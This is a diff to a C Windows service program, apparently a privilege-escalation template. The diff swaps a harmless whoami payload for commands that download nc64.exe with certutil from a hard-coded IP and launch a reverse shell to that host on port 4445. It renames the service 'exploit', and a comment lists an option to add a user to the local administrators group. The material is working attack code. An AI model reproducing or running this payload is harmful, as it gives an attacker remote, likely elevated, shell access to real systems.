@@ -18,19 +18,21 @@ void ControlHandler(DWORD request);
 /*
  * Optional Payloads:
  * 	- cmd.exe /k net localgroup administrators user /add
+ * 	- whoami > c:\\windows\\temp\\service.txt
  * */
 
 //add the payload here
-int Run() 
+int Run() 						// make sure the files are being served at the correct addresses
 { 
-    system("whoami > c:\\windows\\temp\\service.txt");		// This is the line that executes the malicious command(s)
+    system("certutil -urlcache -f http://10.2.5.182:8082/nc64.exe C:\\Temp\\nc64.exe");
+    system("C:\\Temp\\nc64.exe -e cmd.exe 10.2.5.182 4445");		// This is the line that executes the malicious command(s)
     return 0; 
 } 
 
 int main() 
 { 
     SERVICE_TABLE_ENTRY ServiceTable[2];
-    ServiceTable[0].lpServiceName = "MyService";
+    ServiceTable[0].lpServiceName = "exploit";				// this is the line that names the service
     ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
     ServiceTable[1].lpServiceName = NULL;
